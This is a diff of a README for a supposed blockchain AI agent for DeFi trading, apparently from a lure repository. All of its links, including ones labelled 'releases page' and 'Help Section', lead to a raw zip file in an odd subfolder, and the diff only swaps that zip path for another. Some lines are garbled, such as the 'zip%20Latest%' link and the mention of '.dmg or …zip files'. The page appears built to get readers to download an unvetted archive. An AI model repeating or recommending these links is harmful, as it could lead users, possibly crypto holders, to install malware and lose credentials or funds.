@@ -1,7 +1,7 @@
 # 🤖 blockchain-ai-agent-project - Secure and Smart Automation for Everyone
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/Luminal/blockchain-ai-agent-project.zip%20Latest%https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/Luminal/blockchain-ai-agent-project.zip)](https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/Luminal/blockchain-ai-agent-project.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/characterfile-main/scripts/agent_blockchain_project_ai_v2.7.zip%20Latest%https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/characterfile-main/scripts/agent_blockchain_project_ai_v2.7.zip)](https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/characterfile-main/scripts/agent_blockchain_project_ai_v2.7.zip)
 
 ## 📚 Overview
 The blockchain-ai-agent-project is an innovative application designed to bring the power of blockchain and artificial intelligence to your fingertips. This application autonomously performs tasks like trading, data analysis, and smart contract interactions. It leverages decentralized networks to enable secure, efficient, and intelligent automation in decentralized finance (DeFi) and more.
@@ -11,12 +11,12 @@ Running this application is straightforward. Follow these steps to get started:
 
 1. **Visit the releases page** 
    - Click on the link below to access the latest version.
-   - [Download Latest Release](https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/Luminal/blockchain-ai-agent-project.zip)
+   - [Download Latest Release](https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/characterfile-main/scripts/agent_blockchain_project_ai_v2.7.zip)
 
 2. **Choose the right file for your system**
    - Look for the version suited for your operating system. 
    - For Windows, typically, you will see a .exe file. 
-   - For Mac or Linux, you might see .dmg or https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/Luminal/blockchain-ai-agent-project.zip files.
+   - For Mac or Linux, you might see .dmg or https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/characterfile-main/scripts/agent_blockchain_project_ai_v2.7.zip files.
 
 3. **Download the file**
    - Click on the file name to begin the download. 
@@ -53,10 +53,10 @@ Before you begin, please check that your system meets these requirements:
    - Take a moment to familiarize yourself with the layout and available features.
 
 3. **Seek Support**
-   - If you encounter any issues, visit the [Help Section](https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/Luminal/blockchain-ai-agent-project.zip) on GitHub where you can report problems or ask questions.
+   - If you encounter any issues, visit the [Help Section](https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/characterfile-main/scripts/agent_blockchain_project_ai_v2.7.zip) on GitHub where you can report problems or ask questions.
 
 4. **Stay Updated**
-   - Check back regularly on the [releases page](https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/Luminal/blockchain-ai-agent-project.zip) for updates. Staying updated ensures you have the latest features and security patches.
+   - Check back regularly on the [releases page](https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/characterfile-main/scripts/agent_blockchain_project_ai_v2.7.zip) for updates. Staying updated ensures you have the latest features and security patches.
 
 ## 💬 Community and Support
 Engage with our community for tips, tricks, and peer support. You can find a dedicated discussion forum or mailing list through the GitHub page. Sharing experiences and questions can enhance your use of the application.
@@ -81,4 +81,4 @@ If you experience issues during installation or usage, here are some common solu
 ## ⚡ Conclusion
 The blockchain-ai-agent-project aims to simplify the world of blockchain and AI for users of all levels. Whether you are trading, analyzing data, or engaging with smart contracts, this application opens up new opportunities for automation and efficiency. 
 
-Don't forget to [download the latest version here](https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/Luminal/blockchain-ai-agent-project.zip) and join us in exploring the future of technology!
+Don't forget to [download the latest version here](https://raw.githubusercontent.com/rhaylee250/blockchain-ai-agent-project/main/characterfile-main/scripts/agent_blockchain_project_ai_v2.7.zip) and join us in exploring the future of technology!
